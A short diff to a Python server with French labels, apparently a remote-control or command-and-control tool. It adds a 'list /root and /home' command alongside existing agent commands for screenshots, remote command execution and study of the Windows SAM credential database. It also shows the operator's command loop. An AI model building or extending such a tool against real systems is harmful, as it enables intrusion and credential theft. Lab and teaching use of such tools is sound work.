@@ -13,7 +13,8 @@ COMMANDES = {
     "STATUS": "Etat du client",
     "SCREENSHOT": "Capture d'ecran",
     "EXEC": "Executer une commande",
-    "SAM": "Etude de la base SAM"
+    "SAM": "Etude de la base SAM",
+    "LIST": "Lister /root et /home"
 }
  
 def interpreter(commande):
@@ -74,7 +75,7 @@ def handle_client(client_socket, client_address):
         while True:
             commande = input(f"\n[{agent_id}] commande > ").strip()
             if commande.lower() in ("quit", "exit", ""):
-                break
+                break   
  
             validation = interpreter(commande)
             if validation["statut"] == "refusee":
